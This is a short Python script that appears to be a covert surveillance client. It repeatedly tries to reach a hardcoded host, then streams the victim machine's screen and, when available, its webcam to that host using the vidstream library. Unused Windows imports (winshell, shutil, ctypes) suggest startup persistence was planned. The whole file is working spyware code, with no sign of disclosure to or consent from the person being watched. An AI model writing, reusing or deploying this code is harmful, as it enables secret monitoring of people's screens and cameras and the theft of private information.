import ctypes
import os
import sys
import shutil
import winshell
from vidstream import ScreenShareClient, CameraClient
import threading
import time
import socket


host = '192.168.1.194'
port = 5252

def wait_for_server():
    while True:
        try:
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.close()
            screen_sender = ScreenShareClient(host, port)
            camera_sender = CameraClient(host, port)

            time.sleep(10)

            t1 = threading.Thread(target=screen_sender.start_stream)
            t2 = threading.Thread(target=camera_sender.start_stream)

            t1.start()

            if camera_sender.camera_available():
                t2.start()

            while input("") != 'STOP':
                continue

            
            screen_sender.stop_stream()

            
            if camera_sender.camera_available():
                camera_sender.stop_stream()

            break

        except ConnectionRefusedError:
            time.sleep(2)

t = threading.Thread(target=wait_for_server)
t.start()
